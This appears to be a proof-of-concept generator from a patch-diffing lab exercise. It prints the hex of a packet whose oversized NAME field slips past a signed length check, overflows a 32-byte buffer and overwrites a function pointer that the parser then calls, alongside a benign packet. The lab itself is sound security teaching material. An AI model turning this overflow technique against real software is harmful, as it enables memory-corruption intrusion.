#!/usr/bin/env python3
"""Packets for 08-patch-diff. Default output: the PoC hex.

  poc    : NAME TLV with len 0x81. 1.0 checks (int8_t)(len-1) >= 32, and
           (int8_t)0x80 = -128 passes, so memcpy writes 129 bytes into the
           32-byte name[] and overwrites on_complete (struct offset 0x28) with
           0x4141414141414141, which parse_packet() then calls.
  benign : flags + a short name + small payload.
"""
import sys

poc = bytes([0xB1, 0x01, 0x07, 0x00, 0x09, 0x81]) + b"A" * 0x81
benign = bytes([0xB1, 0x01, 0x07, 0x00, 0x01, 0x01, 0x03, 0x09, 0x06]) + b"door-7" + bytes([0xFF, 0x04, 0xDE, 0xAD, 0xBE, 0xEF])

if "--all" in sys.argv:
    print("benign=" + benign.hex())
    print("poc=" + poc.hex())
else:
    print(poc.hex())
